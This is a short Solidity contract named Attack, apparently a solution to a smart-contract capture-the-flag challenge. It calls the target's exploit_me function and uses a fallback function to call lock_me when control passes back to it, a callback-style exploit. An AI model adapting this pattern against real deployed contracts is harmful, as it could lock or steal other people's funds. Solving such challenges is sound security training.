pragma solidity ^0.8.10;

import "./Challenge.sol";

contract Attack {
  Challenge public target;

  constructor(address target_) {
    target = Challenge(target_);
  }

  function attack() public {
    target.exploit_me(msg.sender);
  }

  fallback() external {
    target.lock_me();
  }
}